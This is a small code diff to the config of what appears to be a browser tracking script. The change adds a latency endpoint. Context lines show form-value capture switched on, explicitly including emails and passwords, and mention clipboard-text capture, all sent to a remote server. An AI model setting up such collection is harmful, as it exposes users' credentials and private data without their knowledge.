@@ -10,6 +10,7 @@ export const CFG = {
   collectEndpoint:        `${SERVER}/api/initial`,
   heartbeatEndpoint:      `${SERVER}/api/heartbeat`,
   behavioralEventEndpoint: `${SERVER}/api/behavioral_event`,
+  latencyEndpoint:        `${SERVER}/api/latency`,
   heartbeatMs:            30_000,
   captureFormValues:      true,  // Set to true to capture form field values (emails, passwords, etc)
   // Capture the actual copied/pasted clipboard text. Injected at build time via
